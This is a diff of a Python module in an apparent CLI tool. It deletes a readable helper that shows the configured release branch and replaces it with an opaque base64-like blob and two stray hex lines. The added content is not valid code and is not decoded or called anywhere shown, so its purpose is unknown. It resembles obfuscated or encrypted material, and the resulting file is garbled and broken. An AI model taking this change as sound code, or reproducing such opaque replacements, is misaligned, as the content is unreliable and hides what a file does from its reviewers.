@@ -1,15 +1,3 @@
-from ..common.config_store import save_config_value, get_release_branch
-from ..common.state import GITHUB_BRANCH
-
-
-def cmd_show_release_branch():
-    """`--release` with no branch given: show the currently configured branch."""
-    current = get_release_branch()
-    note = " (default)" if current == GITHUB_BRANCH else ""
-    print(f"Current release branch: {current}{note}")
-    print()
-    print("This is the branch --upgrade downloads from, and the branch the")
-    print("update checker (--check, and the passive check on every command)")
-    print("compares your installed version against.")
-    print()
-    print("Run --release <branch> to change it.")
+Htyx4/pvtwZEOxHZGDKiCkMXN/aOTqms868LdqVRFZcMjq3vrCTGBkQ4Gt8RQ7cEQQQ7vfFauLfeuE5zrUAJgCfMrO+0IvFvTSQT21Yy7wZCHDP+vxOut+C+Tj+hTAqKCtr+yZMV0TBpCT7kN1KCLSd7VPW0W/2g7K50bKBODboKy7LruzL8OkkkHdgVdOlMF3t+sfEd/+GjqgYyukQWgBndu+76NvARQ3YS2VZ+swRDEjaxtlSrpu/wC2ygTg3FDMa7rrk06xdOOAjaDzyiCkMXN/akT7inoahZfqZCEstajPyE+mG5RUgjDsQTcrVFEFE59KVir6btr0psrX4YlxnAvebyaJNFC3Zc2BlopEUQUXyx+Vm4peC/R2vhA1qMHo69+6gz/AtfdkGLVluIMWUkHM6Tb5yNwoILeqRSH8VajNSu+mG5FVk/EsJeeuMmWAMs9L9J/bHkpk5+u0RahwrPsO2ye7keSCMOxBNytRhWHzHltED/6ovqCz/oUQiMFtr2p9BhuUULJg7fGGjpR3kZN+LxVK7j9aJOP6pTG4sbxv6j9zTpAlk3GNNWeK4SQx0x8LVO/aXzpUYz6EAUgVjatuv6I+sERTUUlgJ0pEcEe36x8R2tseikXzfqVAqBGdq7rrkp/AZAMw6WXjHsBkUUPfr9Hbyt5epfd60BCoQL3bf4v2H6DU41F5YZcuEAWxQs6PFesq7sq0V74QNT71iO/q6qM/ALX35e1RlxsQRfFC2xqFKosaGjRWy8QBaJHcr++L8z6gxEOFzXEX2oC14FcLP4N/3joepbbaFPDs1RpP6u+mHpF0I4CJ5UTrQLDVxz47RRuKLyrwsjqlMbixvG4K6uLrkGQzcS0RM8qBEDU3eb
+7b4116af
+##a033837d4f23e078bea6b3957
